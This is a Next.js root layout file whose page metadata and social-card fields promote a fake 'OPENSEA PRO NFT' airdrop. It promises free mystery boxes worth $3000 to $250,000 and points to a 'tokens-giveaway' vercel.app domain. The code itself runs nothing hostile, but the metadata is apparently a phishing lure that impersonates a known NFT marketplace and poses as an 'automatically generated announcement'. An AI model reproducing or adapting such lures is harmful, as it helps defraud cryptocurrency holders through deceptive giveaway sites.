import type { Metadata } from "next";
import type { ReactNode } from "react";

export const metadata: Metadata = {
  title: "CLICK HERE - OPENSEA PRO NFT",
  description:
    "7e2 AIRDROP IS LIVE NOW 7e2 Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
  openGraph: {
    title: "CLICK HERE - OPENSEA PRO NFT",
    description:
      "7e2 AIRDROP IS LIVE NOW 7e2 Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
    url: "https://tokens-giveaway25ksk.vercel.app/",
    siteName: "This is an automatically generated announcement message",
    images: [
      {
        url: "https://tokens-giveaway25ksk.vercel.app/389-9bec97c22fa2e411.gif",
        width: 800,
        height: 600,
        alt: "CLICK HERE - OPENSEA PRO NFT preview",
      },
    ],
    type: "website",
  },
  twitter: {
    card: "summary_large_image",
    title: "CLICK HERE - OPENSEA PRO NFT",
    description:
      "7e2 AIRDROP IS LIVE NOW 7e2 Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
    images: ["https://tokens-giveaway25ksk.vercel.app/389-9bec97c22fa2e411.gif"],
  },
};

export default function RootLayout({ children }: { children: ReactNode }) {
  return (
    <html lang="en-US" data-theme="light">
      <body>{children}</body>
    </html>
  );
}
